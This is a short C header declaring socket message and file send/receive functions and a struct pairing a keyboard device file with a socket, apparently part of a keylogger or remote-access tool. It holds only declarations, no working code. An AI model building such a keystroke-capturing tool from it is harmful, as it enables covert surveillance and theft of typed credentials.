#pragma once
#include "messageManager.h"

struct parameters
{
    int socket_desc;
    int client_sock;
};

typedef struct parameters parameters_t;

struct keyLoggerParameters
{
    char keyboardFile[BUFFER_SIZE];
    int sock;
};  

typedef struct keyLoggerParameters keyLoggerParameters_t;

int sendMessage(int sock, message_t *msg);

int recvMessage(int sock, message_t* msg);

void recvFile(int sock, const char* filename);

void sendFile(int sock, const char *filename);